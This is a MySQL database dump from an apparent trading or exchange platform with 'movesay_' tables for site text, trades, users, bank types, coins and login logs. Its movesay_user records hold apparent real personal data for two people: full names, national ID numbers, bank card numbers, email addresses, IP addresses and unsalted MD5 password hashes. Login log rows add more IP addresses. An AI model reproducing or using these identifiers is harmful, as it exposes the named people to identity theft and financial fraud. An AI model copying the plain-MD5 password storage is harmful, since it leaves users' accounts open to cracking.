INSERT INTO `movesay_text` VALUES ('22', 'user_tpwdset', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464677866', '0', '0');
INSERT INTO `movesay_text` VALUES ('23', 'user_goods', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464677872', '0', '0');
INSERT INTO `movesay_text` VALUES ('24', 'finance_index', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464678956', '0', '0');
INSERT INTO `movesay_text` VALUES ('25', 'finance_mytx', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464678959', '0', '0');
INSERT INTO `movesay_text` VALUES ('26', 'finance_myzr', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464678960', '0', '0');
INSERT INTO `movesay_text` VALUES ('27', 'finance_myzc', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464678961', '0', '0');
INSERT INTO `movesay_text` VALUES ('28', 'finance_mywt', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464678962', '0', '0');
INSERT INTO `movesay_text` VALUES ('29', 'finance_mycj', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464678963', '0', '0');
INSERT INTO `movesay_text` VALUES ('30', 'finance_mytj', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464678964', '0', '0');
INSERT INTO `movesay_text` VALUES ('31', 'finance_mywd', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464678966', '0', '0');
INSERT INTO `movesay_text` VALUES ('32', 'finance_myjp', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464678967', '0', '0');
INSERT INTO `movesay_text` VALUES ('33', 'game_shop_goods', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464695180', '0', '0');
INSERT INTO `movesay_text` VALUES ('34', 'game_issue', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464695216', '0', '0');
INSERT INTO `movesay_text` VALUES ('35', 'game_issue_log', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464695219', '0', '0');
INSERT INTO `movesay_text` VALUES ('36', 'game_fenhong', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464695289', '0', '0');
INSERT INTO `movesay_text` VALUES ('37', 'game_fenhong_log', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464695290', '0', '0');
INSERT INTO `movesay_text` VALUES ('38', 'game_shop', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464695294', '0', '0');
INSERT INTO `movesay_text` VALUES ('39', 'game_shop_log', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464695669', '0', '0');
INSERT INTO `movesay_text` VALUES ('40', 'game_shop_view', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464710521', '0', '0');
INSERT INTO `movesay_text` VALUES ('41', 'game_issue_buy', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464762288', '0', '0');
INSERT INTO `movesay_text` VALUES ('42', 'game_vote', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1464856754', '0', '0');
INSERT INTO `movesay_text` VALUES ('43', 'game_huafei', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1466398472', '0', '0');
INSERT INTO `movesay_text` VALUES ('44', 'game_money', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:\'Microsoft Yahei\', \'Sim sun\', tahoma, \'Helvetica,Neue\', Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1467371753', '0', '0');
INSERT INTO `movesay_text` VALUES ('45', 'game_money_log', '', '<span style=\"color:#0096E0;line-height:21px;background-color:#FFFFFF;\"><span>请在后台修改此处内容</span></span><span style=\"color:#0096E0;line-height:21px;font-family:&quot;Microsoft Yahei&quot;, &quot;Sim sun&quot;, tahoma, &quot;Helvetica,Neue&quot;, Helvetica, STHeiTi, Arial, sans-serif;background-color:#FFFFFF;\">,<span style=\"color:#EE33EE;\">详细信息</span></span>', '0', '1467371757', '0', '0');

-- ----------------------------
-- Table structure for `movesay_trade`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_trade`;
CREATE TABLE `movesay_trade` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `market` varchar(50) NOT NULL,
  `price` decimal(20,8) unsigned NOT NULL,
  `num` decimal(20,8) unsigned NOT NULL,
  `deal` decimal(20,8) unsigned NOT NULL,
  `mum` decimal(20,8) unsigned NOT NULL,
  `fee` decimal(20,8) unsigned NOT NULL,
  `type` tinyint(2) unsigned NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(2) NOT NULL,
  `buyuserid` int(11) DEFAULT NULL,
  `buyid` int(11) DEFAULT NULL,
  `status1` tinyint(2) DEFAULT NULL,
  `imgurl` varchar(300) DEFAULT NULL,
  `paytime` int(11) DEFAULT NULL,
  `shengyu` varchar(1000) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`),
  KEY `market` (`market`,`type`,`status`),
  KEY `num` (`num`,`deal`),
  KEY `status` (`status`),
  KEY `market_2` (`market`)
) ENGINE=MyISAM AUTO_INCREMENT=440732 DEFAULT CHARSET=utf8 COMMENT='交易下单表';

-- ----------------------------
-- Records of movesay_trade
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_trade_json`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_trade_json`;
CREATE TABLE `movesay_trade_json` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `market` varchar(100) NOT NULL,
  `data` varchar(500) NOT NULL,
  `type` varchar(100) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `market` (`market`)
) ENGINE=MyISAM AUTO_INCREMENT=1059801 DEFAULT CHARSET=utf8 COMMENT='交易图表表';

-- ----------------------------
-- Records of movesay_trade_json
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_trade_log`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_trade_log`;
CREATE TABLE `movesay_trade_log` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `peerid` int(11) unsigned NOT NULL,
  `market` varchar(50) NOT NULL,
  `price` decimal(20,8) unsigned NOT NULL,
  `num` decimal(20,8) unsigned NOT NULL,
  `mum` decimal(20,8) unsigned NOT NULL,
  `fee_buy` decimal(20,8) unsigned NOT NULL,
  `fee_sell` decimal(20,8) unsigned NOT NULL,
  `type` tinyint(2) unsigned NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `userid` (`userid`),
  KEY `peerid` (`peerid`),
  KEY `main` (`market`,`status`,`addtime`) USING BTREE
) ENGINE=MyISAM AUTO_INCREMENT=361807 DEFAULT CHARSET=gbk;

-- ----------------------------
-- Records of movesay_trade_log
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_user`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_user`;
CREATE TABLE `movesay_user` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(50) NOT NULL,
  `moble` varchar(50) NOT NULL,
  `mobletime` int(11) unsigned NOT NULL,
  `password` varchar(32) NOT NULL,
  `tpwdsetting` varchar(32) NOT NULL,
  `paypassword` varchar(32) NOT NULL,
  `invit_1` varchar(50) NOT NULL,
  `invit_2` varchar(50) NOT NULL,
  `invit_3` varchar(50) NOT NULL,
  `truename` varchar(32) NOT NULL,
  `idcard` varchar(32) NOT NULL,
  `logins` int(11) unsigned NOT NULL,
  `ga` varchar(50) NOT NULL,
  `addip` varchar(50) NOT NULL,
  `addr` varchar(50) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL,
  `email` varchar(200) DEFAULT NULL COMMENT '邮箱',
  `alipay` varchar(200) DEFAULT NULL COMMENT '支付宝',
  `invit` varchar(50) NOT NULL,
  `token` varchar(50) DEFAULT NULL,
  `Country` varchar(200) DEFAULT NULL,
  `bankcard` varchar(200) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `username` (`username`),
  KEY `status` (`status`)
) ENGINE=MyISAM AUTO_INCREMENT=10357 DEFAULT CHARSET=utf8 COMMENT='用户信息表';

-- ----------------------------
-- Records of movesay_user
-- ----------------------------
INSERT INTO `movesay_user` VALUES ('10349', 'myworld', '', '0', 'e995f27198e83ad251c71fb5fb9c49fe', '1', 'b4001bdbe2a70eaeeec9092279ab6b32', '0', '0', '0', '黄培基', '441622198303271570', '23', '', '183.3.255.35', '未分配或者内网IP', '0', '1521696329', '0', '1', '44381709@qq.com', '', 'EINVZS', '', 'CN', '6217903100010651826');
INSERT INTO `movesay_user` VALUES ('10356', 'PANRU123456', '', '0', 'c42cb8206f3b6434a094ab946383933d', '1', 'e10adc3949ba59abbe56e057f20f883e', '0', '0', '0', '潘汝', '430921199508022238', '0', '', '103.48.169.193', '未分配或者内网IP', '0', '1522218065', '0', '1', '1024637723@qq.com', null, 'BXRQHG', null, 'CN', '6212261901014457335');

-- ----------------------------
-- Table structure for `movesay_user_bank`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_user_bank`;
CREATE TABLE `movesay_user_bank` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `name` varchar(200) NOT NULL,
  `bank` varchar(200) NOT NULL,
  `bankprov` varchar(200) NOT NULL,
  `bankcity` varchar(200) NOT NULL,
  `bankaddr` varchar(200) NOT NULL,
  `bankcard` varchar(200) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  `qianbao` varchar(500) DEFAULT NULL,
  `weixin` varchar(500) DEFAULT NULL,
  `alipay` varchar(500) DEFAULT NULL,
  `yitai` varchar(500) DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `userid` (`userid`)
) ENGINE=MyISAM AUTO_INCREMENT=5377 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of movesay_user_bank
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_user_bank_type`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_user_bank_type`;
CREATE TABLE `movesay_user_bank_type` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `name` varchar(200) NOT NULL,
  `title` varchar(200) NOT NULL,
  `url` varchar(200) NOT NULL,
  `img` varchar(200) NOT NULL,
  `mytx` varchar(200) NOT NULL,
  `remark` varchar(50) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `name` (`name`)
) ENGINE=MyISAM AUTO_INCREMENT=32 DEFAULT CHARSET=utf8 COMMENT='常用银行地址';

-- ----------------------------
-- Records of movesay_user_bank_type
-- ----------------------------
INSERT INTO `movesay_user_bank_type` VALUES ('4', 'boc', '中国银行', 'http://www.boc.cn/', 'img_56937003683ce.jpg', '', '', '0', '1452503043', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('5', 'abc', '农业银行', 'http://www.abchina.com/cn/', 'img_569370458b18d.jpg', '', '', '0', '1452503109', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('6', 'bccb', '北京银行', 'http://www.bankofbeijing.com.cn/', 'img_569370588dcdc.jpg', '', '', '0', '1452503128', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('8', 'ccb', '建设银行', 'http://www.ccb.com/', 'img_5693709bbd20f.jpg', '', '', '0', '1452503195', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('9', 'ceb', '光大银行', 'http://www.bankofbeijing.com.cn/', 'img_569370b207cc8.jpg', '', '', '0', '1452503218', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('10', 'cib', '兴业银行', 'http://www.cib.com.cn/cn/index.html', 'img_569370d29bf59.jpg', '', '', '0', '1452503250', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('11', 'citic', '中信银行', 'http://www.ecitic.com/', 'img_569370fb7a1b3.jpg', '', '', '0', '1452503291', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('12', 'cmb', '招商银行', 'http://www.cmbchina.com/', 'img_5693710a9ac9c.jpg', '', '', '0', '1452503306', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('13', 'cmbc', '民生银行', 'http://www.cmbchina.com/', 'img_5693711f97a9d.jpg', '', '', '0', '1452503327', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('14', 'comm', '交通银行', 'http://www.bankcomm.com/BankCommSite/default.shtml', 'img_5693713076351.jpg', '', '', '0', '1452503344', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('16', 'gdb', '广发银行', 'http://www.cgbchina.com.cn/', 'img_56937154bebc5.jpg', '', '', '0', '1452503380', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('17', 'icbc', '工商银行', 'http://www.icbc.com.cn/icbc/', 'img_56937162db7f5.jpg', '', '', '0', '1452503394', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('19', 'psbc', '邮政银行', 'http://www.psbc.com/portal/zh_CN/index.html', 'img_5693717eefaa3.jpg', '', '', '0', '1452503422', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('20', 'spdb', '浦发银行', 'http://www.spdb.com.cn/chpage/c1/', 'img_5693718f1d70e.jpg', '', '', '0', '1452503439', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('21', 'szpab', 'PingAn Bank', 'http://bank.pingan.com/', '56c2e4c9aff85.jpg', '', '', '0', '1455613129', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('22', 'Citibank', 'Citibank', '', '', '', '', '1', '0', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('23', 'Standard Chartered Bank', 'Standard Chartered Bank', '', '', '', '', '1', '0', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('24', 'HSBC', 'HSBC', '', '', '', '', '1', '0', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('25', 'BANK OF AMERICA', 'BANK OF AMERICA', '', '', '', '', '1', '0', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('26', 'US.BANK', 'US.BANK', '', '', '', '', '1', '0', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('27', 'American Express', 'American Express', '', '', '', '', '1', '0', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('28', 'Sberbank', 'Sberbank', '', '', '', '', '1', '0', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('29', 'Vneshtorbank', 'Vneshtorbank', '', '', '', '', '1', '0', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('30', 'Gazprom', 'Gazprom', '', '', '', '', '1', '0', '0', '1');
INSERT INTO `movesay_user_bank_type` VALUES ('31', 'Globex', 'Globex', '', '', '', '', '1', '0', '0', '1');

-- ----------------------------
-- Table structure for `movesay_user_coin`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_user_coin`;
CREATE TABLE `movesay_user_coin` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(10) unsigned NOT NULL,
  `usd` decimal(20,8) unsigned NOT NULL,
  `usdd` decimal(20,8) unsigned NOT NULL,
  `usdb` varchar(200) NOT NULL,
  `integral` decimal(20,8) NOT NULL,
  `pvc` decimal(20,8) unsigned NOT NULL,
  `pvcd` decimal(20,8) unsigned NOT NULL,
  `pvcb` varchar(200) NOT NULL,
  `ppc` decimal(20,8) unsigned NOT NULL,
  `ppcd` decimal(20,8) unsigned NOT NULL,
  `ppcb` varchar(200) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`)
) ENGINE=MyISAM AUTO_INCREMENT=10357 DEFAULT CHARSET=utf8 COMMENT='用户币种表';

-- ----------------------------
-- Records of movesay_user_coin
-- ----------------------------
INSERT INTO `movesay_user_coin` VALUES ('10355', '10355', '0.00000000', '0.00000000', '', '10000.00000000', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '');
INSERT INTO `movesay_user_coin` VALUES ('10356', '10356', '0.00000000', '0.00000000', '', '10000.00000000', '0.00000000', '0.00000000', '', '0.00000000', '0.00000000', '');

-- ----------------------------
-- Table structure for `movesay_user_coin_log`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_user_coin_log`;
CREATE TABLE `movesay_user_coin_log` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `userid` int(11) NOT NULL,
  `pvcold` decimal(20,8) NOT NULL,
  `pvcnew` decimal(20,8) NOT NULL,
  `addtime` int(11) NOT NULL,
  `adminid` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=364 DEFAULT CHARSET=gbk;

-- ----------------------------
-- Records of movesay_user_coin_log
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_user_goods`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_user_goods`;
CREATE TABLE `movesay_user_goods` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `name` varchar(200) NOT NULL,
  `truename` varchar(200) NOT NULL,
  `idcard` varchar(200) NOT NULL,
  `moble` varchar(200) NOT NULL,
  `addr` varchar(200) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`),
  KEY `status` (`status`)
) ENGINE=MyISAM AUTO_INCREMENT=106 DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of movesay_user_goods
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_user_log`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_user_log`;
CREATE TABLE `movesay_user_log` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(10) unsigned NOT NULL,
  `type` varchar(200) NOT NULL,
  `en_type` varchar(200) DEFAULT NULL,
  `remark` varchar(200) NOT NULL,
  `en_remark` varchar(200) DEFAULT NULL,
  `addip` varchar(200) NOT NULL,
  `addr` varchar(200) NOT NULL,
  `en_addr` varchar(200) DEFAULT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(10) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` tinyint(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `userid` (`userid`),
  KEY `status` (`status`)
) ENGINE=MyISAM AUTO_INCREMENT=911573 DEFAULT CHARSET=utf8 COMMENT='用户记录表';

-- ----------------------------
-- Records of movesay_user_log
-- ----------------------------
INSERT INTO `movesay_user_log` VALUES ('911569', '10351', '登录', 'Login', '通过用户名登录', 'Login by account', '43.250.8.182', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1522209745', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('911570', '10355', '登录', 'Login', '通过用户名登录', 'Login by account', '183.197.16.246', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1522319833', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('911571', '10349', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.184.28', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1522414416', '0', '1');
INSERT INTO `movesay_user_log` VALUES ('911572', '10349', '登录', 'Login', '通过用户名登录', 'Login by account', '14.153.185.39', '未分配或者内网IP', 'Not assigned or within the network IP', '0', '1522642595', '0', '1');

-- ----------------------------
-- Table structure for `movesay_user_qianbao`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_user_qianbao`;
CREATE TABLE `movesay_user_qianbao` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL,
  `coinname` varchar(200) NOT NULL,
  `name` varchar(200) NOT NULL,
  `addr` varchar(200) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `userid` (`userid`),
  KEY `coinname` (`coinname`)
) ENGINE=MyISAM AUTO_INCREMENT=28466 DEFAULT CHARSET=utf8 COMMENT='用户钱包表';

-- ----------------------------
-- Records of movesay_user_qianbao
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_user_shopaddr`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_user_shopaddr`;
CREATE TABLE `movesay_user_shopaddr` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `userid` int(11) unsigned NOT NULL DEFAULT '0',
  `truename` varchar(200) NOT NULL DEFAULT '0',
  `moble` varchar(500) NOT NULL,
  `name` varchar(500) NOT NULL,
  `sort` int(11) unsigned NOT NULL,
  `addtime` int(11) unsigned NOT NULL,
  `endtime` int(11) unsigned NOT NULL,
  `status` int(4) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `status` (`status`),
  KEY `userid` (`userid`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of movesay_user_shopaddr
-- ----------------------------

-- ----------------------------
-- Table structure for `movesay_version`
-- ----------------------------
DROP TABLE IF EXISTS `movesay_version`;
CREATE TABLE `movesay_version` (
  `name` varchar(50) NOT NULL COMMENT '版本号',
  `number` int(11) NOT NULL COMMENT '序列号，一般用日期数字标示',
  `title` varchar(50) NOT NULL COMMENT '版本名',
  `create_time` int(11) NOT NULL COMMENT '发布时间',
  `update_time` int(11) NOT NULL COMMENT '更新的时间',
  `log` text NOT NULL COMMENT '更新日志',
  `url` varchar(150) NOT NULL COMMENT '链接到的远程文章',
  `is_current` tinyint(4) NOT NULL,
  `status` tinyint(4) NOT NULL,
  PRIMARY KEY (`name`),
  KEY `id` (`number`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8 ROW_FORMAT=DYNAMIC COMMENT='自动更新表';

-- ----------------------------
-- Records of movesay_version
-- ----------------------------
